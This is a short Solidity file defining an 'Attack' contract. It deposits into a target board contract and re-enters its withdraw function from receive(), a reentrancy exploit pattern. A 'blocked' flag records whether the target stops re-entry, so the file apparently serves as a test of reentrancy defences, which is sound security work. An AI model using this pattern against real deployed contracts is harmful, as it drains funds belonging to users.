// SPDX-License-Identifier: MIT
pragma solidity ^0.8.30;
interface IBoard { function deposit() external payable; function withdraw(uint256,address payable) external; }
contract Attack {
    IBoard public immutable board; bool public blocked;
    constructor(address target) { board=IBoard(target); }
    function fund() external payable { board.deposit{value:msg.value}(); }
    function attack() external { board.withdraw(1 ether,payable(address(this))); }
    receive() external payable { try board.withdraw(1 ether,payable(address(this))) {} catch { blocked=true; } }
}
